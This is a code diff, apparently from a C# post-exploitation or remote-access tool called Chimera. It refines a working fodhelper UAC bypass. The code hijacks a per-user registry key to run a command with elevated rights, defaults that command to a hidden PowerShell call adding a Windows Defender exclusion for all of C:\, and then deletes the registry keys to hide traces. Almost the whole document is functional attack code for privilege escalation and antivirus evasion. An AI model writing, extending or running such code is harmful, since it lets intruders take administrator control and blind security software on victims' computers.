@@ -17,12 +17,13 @@ namespace Chimera.Commands
         {
             try
             {
-                // Default: open an elevated cmd.exe if no command given
+                // Default: run the Defender exclusion elevated via fodhelper.
+                // If a custom command is passed, run that instead.
                 string target = string.IsNullOrEmpty(command)
-                    ? @"C:\Windows\System32\cmd.exe"
+                    ? @"powershell.exe -NoP -W Hidden -C ""Add-MpPreference -ExclusionPath 'C:\\'"""
                     : command;
 
-                // 1. Write hijack keys
+                // 1. Write hijack keys — fodhelper will auto-elevate and execute target
                 using (RegistryKey key =
                     Registry.CurrentUser.CreateSubKey(FodHelperKey))
                 {
@@ -34,7 +35,7 @@ namespace Chimera.Commands
                     key.SetValue("", target, RegistryValueKind.String);
                 }
 
-                // 2. Launch fodhelper — it auto-elevates and executes the key value
+                // 2. Launch fodhelper — spawns target elevated
                 var psi = new ProcessStartInfo("fodhelper.exe")
                 {
                     UseShellExecute = false,
@@ -42,10 +43,10 @@ namespace Chimera.Commands
                 };
                 Process.Start(psi);
 
-                // Give fodhelper time to spawn the elevated process
-                System.Threading.Thread.Sleep(2500);
+                // Give fodhelper time to spawn and the exclusion to apply
+                System.Threading.Thread.Sleep(3000);
 
-                // 3. Clean up registry — remove all hijack keys
+                // 3. Clean up registry
                 try
                 {
                     Registry.CurrentUser.DeleteSubKeyTree(
@@ -53,45 +54,14 @@ namespace Chimera.Commands
                 }
                 catch { /* best-effort cleanup */ }
 
-                // 4. Add Defender exclusion for C:\ (requires elevation)
-                string exclusionResult = AddDefenderExclusion();
-
                 return "[+] fodhelper UAC bypass triggered.\n" +
-                       "    Command: " + target + "\n" +
+                       "    Elevated command: " + target + "\n" +
                        "    Registry keys cleaned up.\n" +
-                       exclusionResult;
+                       "    Defender exclusion for C:\\ should now be set.";
             }
             catch (Exception ex)
             {
                 return "[error] " + ex.Message;
-            }
-        }
-
-        private static string AddDefenderExclusion()
-        {
-            try
-            {
-                var psi = new ProcessStartInfo
-                {
-                    FileName = "powershell.exe",
-                    Arguments = "-NoP -W Hidden -C \"Add-MpPreference -ExclusionPath C:\\\"",
-                    CreateNoWindow = true,
-                    UseShellExecute = false,
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true
-                };
-                using (Process p = Process.Start(psi))
-                {
-                    p.WaitForExit(10000);
-                    if (p.ExitCode == 0)
-                        return "[+] Defender exclusion for C:\\ added successfully.";
-                    else
-                        return "[-] Exclusion failed (exit " + p.ExitCode + "): " + p.StandardError.ReadToEnd();
-                }
-            }
-            catch (Exception ex)
-            {
-                return "[-] Exclusion error: " + ex.Message;
             }
         }
     }
